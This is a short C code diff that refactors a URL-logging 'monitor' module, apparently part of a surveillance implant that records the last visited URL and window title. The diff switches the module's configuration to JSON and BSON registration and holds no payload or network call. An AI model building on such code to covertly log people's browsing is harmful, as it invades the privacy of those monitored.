@@ -434,9 +434,8 @@ DWORD __stdcall PM_UrlLogStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_UrlLogInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_UrlLogInit(JSONObject elem)
 {
-	PM_UrlLogStartStop(bStartFlag, TRUE);
 	ZeroMemory(last_url, sizeof(last_url));
 	ZeroMemory(last_window_title, sizeof(last_window_title));
 	return 1;
@@ -445,10 +444,5 @@ DWORD __stdcall PM_UrlLogInit(BYTE *conf_ptr, BOOL bStartFlag)
 
 void PM_UrlLogRegister()
 {
-	// L'hook viene registrato dalla funzione HM_InbundleHooks
-	AM_MonitorRegister(PM_URLLOG, (BYTE *)PM_UrlLogDispatch, (BYTE *)PM_UrlLogStartStop, (BYTE *)PM_UrlLogInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_UrlLogInit(NULL, FALSE);
+	AM_MonitorRegisterBSON(L"url", PM_URLLOG, (BYTE *)PM_UrlLogDispatch, (BYTE *)PM_UrlLogStartStop, (BYTE *)PM_UrlLogInit, NULL);
 }
